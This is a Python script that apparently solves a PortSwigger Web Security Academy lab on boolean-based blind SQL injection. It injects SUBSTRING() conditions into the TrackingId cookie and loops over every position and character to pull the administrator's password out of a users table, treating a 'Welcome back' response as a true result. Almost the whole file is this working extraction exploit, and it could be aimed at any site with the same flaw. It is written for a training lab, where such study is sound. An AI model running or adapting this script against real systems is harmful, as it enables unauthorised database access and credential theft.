import requests
import string

# ─────────────────────────────────────────────────────────────────────────────
# Blind SQL Injection — Boolean-Based Password Extractor
# Lab: PortSwigger Web Security Academy
#      "Blind SQL injection with conditional responses"
#
# How it works:
#   Injects SUBSTRING() conditions into the TrackingId cookie.
#   "Welcome back" in the response → condition is TRUE → character matched.
#   Iterates all 20 positions × a-z0-9 charset to reconstruct the full password.
#
# Usage:
#   Update tracking_id and session_cookie with YOUR lab values, then run:
#   python3 blind_sqli.py
# ─────────────────────────────────────────────────────────────────────────────

# Target URL (update with your lab subdomain)
url = "https://0acf0024036c1378801653a800e3000f.web-security-academy.net/filter?category=Accessories"

# Base TrackingId — the original cookie value WITHOUT any injection
tracking_id = "U8sz74OYetWfpt19"

# Session cookie — copy from your browser / Burp after loading the lab
session_cookie = "OKO7i0Bg0EUBHKnX91F7rA0RDIZVq7Qj"

# Charset: lowercase letters + digits (as confirmed by the lab)
charset = string.ascii_lowercase + string.digits

# ─── Main extraction loop ────────────────────────────────────────────────────

password = ""

for position in range(1, 21):  # Password is 20 characters long
    print(f"[+] Testing position {position}...")

    for char in charset:
        # Build the boolean injection payload
        payload = (
            f"{tracking_id}' AND "
            f"(SELECT SUBSTRING(password,{position},1) FROM users "
            f"WHERE username='administrator')='{char}'--"
        )

        cookies = {
            "TrackingId": payload,
            "session": session_cookie
        }

        response = requests.get(url, cookies=cookies)

        # TRUE condition → "Welcome back" appears in the response body
        if "Welcome back" in response.text:
            print(f"[✔] Found character at position {position}: {char}")
            password += char
            break

    else:
        # No character matched at this position
        print(f"[!] No match found at position {position} — check cookie values")

print(f"\n[🔥] Extracted Password: {password}")
